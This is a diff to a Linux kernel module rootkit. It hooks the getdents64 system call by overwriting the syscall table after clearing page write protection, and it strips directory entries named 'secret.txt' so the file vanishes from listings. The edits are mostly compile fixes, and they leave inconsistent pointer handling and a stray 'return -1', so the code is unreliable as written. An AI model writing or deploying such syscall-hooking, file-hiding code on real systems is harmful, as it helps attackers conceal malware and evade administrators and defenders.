@@ -9,7 +9,7 @@
 #include <linux/kallsyms.h>
 #define FILE_NAME_TO_HIDE "secret.txt"
 unsigned long *sys_call_table;
-asmlinkage int (*org_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage long unsigned int (*org_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 asmlinkage int sys_getdents64_hook (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
 {
     int rtn;
@@ -30,11 +30,14 @@ asmlinkage int sys_getdents64_hook (unsigned int fd, struct linux_dirent64 *dirp
 
         // in strcmp return 0 means strings are equal
         if (strncmp(cur->d_name, FILE_NAME_TO_HIDE, strlen(FILE_NAME_TO_HIDE)) == 0)
-        {         
-            printk(KERN_ALERT "found it!");                                                  
+        {    
+                 
+            printk(KERN_ALERT "found it!"); 
+            int reclen;
+            char *next_rec;                                                 
             //get rid of our file form the syscall
-            int reclen = cur->d_reclen; // getting the size of the dirent
-            char *next_rec = (char *)cur + reclen; //create a char * that will point to the next place in the buffer of dirs   
+            reclen = cur->d_reclen; // getting the size of the dirent
+            next_rec = (char *)cur + reclen; //create a char * that will point to the next place in the buffer of dirs   
             int len = (uintptr_t)dirp + rtn - (uintptr_t) next_rec; // calculte the len of this char * inside the struct
             memmove(cur, next_rec, len);//copy it to the cur
             rtn-=reclen; //remove the size of reclen from rtn because we want to get rid of it
@@ -45,10 +48,10 @@ asmlinkage int sys_getdents64_hook (unsigned int fd, struct linux_dirent64 *dirp
     }
     return rtn;
 }
-int set_page_write(unsigned long addr)
+int set_page_write(unsigned long *addr)
 {
     unsigned int level;
-    pte_t *pte = lookup_address(addr, &level);
+    pte_t *pte = lookup_address(*addr, &level);
     if (pte->pte &~ _PAGE_RW)
     {
         pte->pte |= _PAGE_RW;
@@ -56,10 +59,10 @@ int set_page_write(unsigned long addr)
     }
     return 0;
 }
-void set_page_no_write(unsigned long addr)
+void set_page_no_write(unsigned long *addr)
 {
     unsigned int level;
-    pte_t *pte = lookup_address(addr, &level);
+    pte_t *pte = lookup_address((unsigned long) addr, &level);
     pte->pte = pte->pte &~_PAGE_RW;
 }
 int replace_getdents_syscall(void)
@@ -78,6 +81,7 @@ int replace_getdents_syscall(void)
         return -1;
 
     }
+    return -1;
 
 }
 void remove_hook(void)
